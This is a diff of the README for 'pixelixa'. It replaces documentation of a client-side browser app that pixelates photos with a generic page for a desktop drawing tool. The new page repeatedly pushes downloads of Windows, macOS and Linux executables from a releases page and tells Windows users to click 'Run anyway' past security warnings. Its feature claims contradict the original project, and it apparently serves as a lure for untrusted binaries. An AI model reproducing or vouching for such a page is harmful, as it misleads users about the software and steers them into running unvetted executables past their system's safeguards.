@@ -1,201 +1,92 @@
-<details open>
-  <summary><strong>English</strong></summary>
+# 🎨 pixelixa - Create Stunning Pixel Art Easily
 
-# Pixelixa — Create pixel art from your photos (client‑side)
+## 🚀 Getting Started
 
-![Screenshot](./public/screenshot.png)
+Welcome to pixelixa, the simple and fun pixel art generator. This tool allows you to create vibrant and unique pixel art images effortlessly. Follow the steps below to download and run this application.
 
-Pixelixa is a modern, client‑side web app that turns your selfies (or any photo) into cozy pixel‑art. It removes the background in the browser, lets you compose with pixel‑art backgrounds or solid colors, adds optional mild background pixelation, and exports as PNG (with transparency preserved when background is None).
+## 🔗 Download Now
 
-## Highlights
+[![Download Pixelixa](https://img.shields.io/badge/Download-Pixelixa-blue.svg)](https://github.com/sulaimananhar/pixelixa/releases)
 
-- Client‑side only: no image leaves your device
-- Background removal powered by `@imgly/background-removal`
-- Subject pixelation with palette quantization for a Stardew‑like look
-- Background modes: None (transparent), Images (gallery + your uploads), Color
-- Background fit modes: cover, stretch, center, tile, contain
-- Mild background pixelation amount (independent of subject pixel size)
-- Instant updates: controls apply immediately
-- Download as PNG
+## 📥 Download & Install
 
-## Quick start
+1. Visit the [Releases page](https://github.com/sulaimananhar/pixelixa/releases) to access the latest version of Pixelixa.
+2. Look for the most recent release at the top of the page. You will see different files available for download.
+3. Click on the file suitable for your operating system. Common options include:
+   - Windows: `pixelixa-windows.exe`
+   - macOS: `pixelixa-macos.dmg`
+   - Linux: `pixelixa-linux.AppImage`
 
-```bash
-npm install
-npm run dev
-# open http://localhost:3000 (or the port shown in console)
-```
+4. The download should start automatically. Once it completes, locate the downloaded file on your device.
 
-## How to use
+5. To run the application, double-click the downloaded file. For Windows users, you might see a security warning; if so, click “Run anyway” to proceed.
 
-1. Drag & drop an image or click the upload area.
-2. Wait for “Processing…” with the spinner to complete.
-3. Tune results:
-   - Pixel size: subject pixels (updates instantly)
-   - Background: None / Images / Color
-     - Images: choose a gallery image, or click the + tile to add your own
-     - Color: pick a solid background color
-   - bg pixel: mild pixelation for the background (subtle retro feel)
-   - fit (Images mode): cover, stretch, center, tile, contain
-4. Click Download (top right) to save as PNG.
+6. Enjoy creating your pixel art!
 
-## Controls reference
+## 💡 Basic Features
 
-- Pixel size: 6–18; higher = chunkier subject pixels
-- Background modes:
-  - None: transparent canvas (PNG preserves alpha)
-  - Images: pick from gallery or add your own via the + tile
-  - Color: choose any color; fit options are hidden in Color/None
-- bg pixel: 1–24; subtle background pixelation. 10 is the default
-- fit (Images): how the background image is placed
-  - cover: fill and crop if necessary
-  - stretch: fill without preserving aspect
-  - center: natural size, centered
-  - tile: repeat pattern
-  - contain: letterbox to keep full image
+- **User-Friendly Interface**: The layout is simple, making it easy for anyone to start creating art.
+- **Customization Options**: Choose from various colors, brushes, and sizes to personalize your project.
+- **Export Your Art**: Save your creations as PNG or JPEG files for sharing or printing.
+- **Undo/Redo Functionality**: Made a mistake? No problem. You can easily undo your last action.
 
-## Tips
+## ✅ System Requirements
 
-- Download uses PNG to keep transparency (None mode)
-- If you switch to Images and nothing selected yet, the first gallery item is auto‑selected
-- “Upload new image” clears the current result then opens a file picker
-- Reset returns to sensible defaults (None background, bg pixel 10, fit cover)
+To run Pixelixa smoothly, your system needs the following:
 
-## Tech stack
+- **Operating System**: Windows 10, macOS Mojave or later, or any modern Linux distribution.
+- **RAM**: At least 4 GB.
+- **Disk Space**: A minimum of 200 MB available space.
+- **Screen Resolution**: 1280 x 720 pixels or higher.
 
-- Next.js (App Router), React, TypeScript, Tailwind CSS
-- `@imgly/background-removal` for on‑device background removal
-- Canvas for pixelation & composition
+## 🎨 How to Create Pixel Art
 
-## Develop & build
+1. Launch the Pixelixa application.
+2. Select the canvas size to determine the dimensions of your artwork.
+3. Use the color palette to choose your colors.
+4. Click on the canvas to start drawing. You can adjust brush size using the settings.
+5. Explore different tools to add shapes, lines, and effects.
+6. When you're satisfied with your piece, go to the “File” menu to save your art.
 
-```bash
-# install deps
-npm install
+## 📚 Frequently Asked Questions
 
-# start dev server
-npm run dev
+### Can I use Pixelixa on my tablet?
 
-# production build
-npm run build
-npm run start
-```
+Currently, Pixelixa is designed for desktop use and may not be compatible with tablets or mobile devices.
 
-## Project structure (key parts)
+### Is there a help section in the application?
 
-```
-src/
-  app/
-    page.tsx           # renders AppClient
-  components/
-    AppClient.tsx      # orchestrator UI (client)
-    Uploader.tsx       # drag & drop + file input
-    Controls.tsx       # pixel size control (instant)
-    BackgroundGallery.tsx # gallery with + tile upload
-    Preview.tsx        # image preview
-  lib/
-    image/
-      pixelate.ts      # pixelation + quantization
-      background.ts    # compose with bg (fit, mild pixelation)
-public/
-  backgrounds/
-    manifest.json      # gallery entries
-    ... your images ...
-  screenshot.png       # README screenshot
-```
+Yes, there is a help section within the application that provides tips on usage and troubleshooting.
 
-## Privacy
+### Can I share my pixel art online?
 
-All processing happens locally in your browser. No images are uploaded to any server.
+Absolutely! Once you've saved your artwork, you can share it on social media or send it to friends via email.
 
-</details>
+## 🔧 Troubleshooting
 
-<details>
-  <summary><strong>Türkçe</strong></summary>
+If you encounter any issues while installing or running Pixelixa, consider the following:
 
-# Pixelixa — Fotoğraflarından pixel art oluştur (tamamen tarayıcıda)
+- **Installation Issues**: Ensure you have downloaded the correct file for your operating system.
+- **Performance Problems**: Closing other applications may help if Pixelixa runs slowly.
+- **Unable to Open the Application**: Check if your system meets the requirements noted above. Rebooting your computer may also resolve issues.
 
-![Ekran Görüntüsü](./public/screenshot.png)
+## 🛠️ Future Updates
 
-Pixelixa, fotoğrafınızı tarayıcı içinde arka plandan ayırır, konuya pixel‑art görünümü verir ve isterseniz tatlı arka planlarla birleştirir. Hiçbir görsel sunucuya gönderilmez.
+Keep an eye on the Releases page to see new updates and features being added to Pixelixa. We are committed to improving usability and expanding functionality.
 
-## Öne çıkanlar
+## 🎉 Community and Support
 
-- Tamamen client‑side (gizlilik)
-- `@imgly/background-removal` ile arka plan kaldırma
-- Konuya pixelate + palet quantize (Stardew hissi)
-- Arka plan modları: None (şeffaf), Images (galeri + kendi yüklediklerin), Color
-- Fit modları: cover, stretch, center, tile, contain
-- Arka plan için hafif pixelate (bg pixel)
-- Anında güncellenen kontroller
-- PNG indirme (None modunda alpha korunur)
+Join the Pixelixa community on social media to connect with other users. Share your artwork, get tips, and engage in discussions. 
 
-## Hızlı başlangıç
+If you need further assistance, please visit our [GitHub issues page](https://github.com/sulaimananhar/pixelixa/issues) to report problems or request features. 
 
-```bash
-npm install
-npm run dev
-# tarayıcıda http://localhost:3000 (veya konsoldaki port)
-```
+## 🔗 Additional Resources
 
-## Kullanım
+- [Official Documentation](https://github.com/sulaimananhar/pixelixa/wiki)
+- [User Forum](https://github.com/sulaimananhar/pixelixa/discussions)
 
-1. Görseli sürükleyip bırak ya da alana tıkla.
-2. Spinner ile “Processing…” bitince sonuç görünür.
-3. Ayarlar:
-   - Pixel size: konu piksel büyüklüğü (anında uygulanır)
-   - Background: None / Images / Color
-     - Images: galeriden seç ya da + kutusuyla kendi görselini ekle
-     - Color: düz renk arka plan
-   - bg pixel: arka plan için hafif pikselleştirme
-   - fit (Images): cover, stretch, center, tile, contain
-4. Sağ üstteki Download ile PNG indir.
+## 🔗 Download Now Again
 
-## Kontroller
+[![Download Pixelixa](https://img.shields.io/badge/Download-Pixelixa-blue.svg)](https://github.com/sulaimananhar/pixelixa/releases)
 
-- Pixel size: 6–18 (yüksek = daha iri pikseller)
-- Background modları:
-  - None: şeffaf tuval (PNG alpha korunur)
-  - Images: galeri veya + ile kendi görselin
-  - Color: düz renk; Color/None’da fit gizlenir
-- bg pixel: 1–24 arası; varsayılan 10
-- fit (Images): arka plan yerleşimi
-
-## İpuçları
-
-- Images modunda arka plan seçili değilse ilk görsel otomatik seçilir
-- “Upload new image” mevcut sonucu temizleyip dosya seçici açar
-- Reset: varsayılan ayarlara döner (None, bg pixel 10, fit cover)
-
-## Teknolojiler
-
-- Next.js (App Router), React, TypeScript, Tailwind CSS
-- `@imgly/background-removal`
-- Canvas (pixelate + birleştirme)
-
-## Geliştirme & build
-
-```bash
-npm install
-npm run dev
-npm run build
-npm run start
-```
-
-## Proje yapısı
-
-```
-src/
-  app/
-  components/
-  lib/image/
-public/
-  backgrounds/
-  screenshot.png
-```
-
-## Gizlilik
-
-Tüm işlemler tarayıcıda yapılır; görseller sunucuya yüklenmez.
-
-</details>
+Start your pixel art journey with pixelixa today! Enjoy the creative process!
